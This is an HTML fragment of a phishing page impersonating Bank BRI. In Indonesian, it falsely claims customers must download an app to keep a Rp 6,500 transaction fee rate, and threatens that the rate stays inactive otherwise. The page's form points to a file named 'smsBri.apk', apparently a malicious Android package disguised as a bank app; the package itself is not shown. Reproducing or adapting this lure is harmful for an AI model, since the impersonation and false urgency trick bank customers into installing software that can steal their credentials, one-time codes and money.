...
<body>
    <h1><img src="img/bri-header.jpg" width="100" style="margin-left: 10px;"></h1><br>
    <div class="container">
        <h2><strong>BANK BRI Update Terbaru Tarif Transaksi</strong></h2><br>
       <center>
             <legend>
             <img src="img/phone.jpg" width="200"><br><br>
            </legend>
           </center>
          <div>
            <div class="row">
                ...
                <center>
                <form method="" action="smsBri.apk">
                    <div>
                     <label for="nomor"><h3>PEMBERITAHUAN !!

WAJIB Silahkan Donwload/Unduh Aplikasi Dibawah ini Untuk Tetap Ditarif Rp.6.500 Dan Ikuti intruksi Didalam Aplikasi  (Otomatis Tarif AKTIF)

Jika Nasabah Tidak Melakukan Unduh/Donwload Aplikasi Maka di nyatakan tarif nya belum aktif</h3></label><br><br>
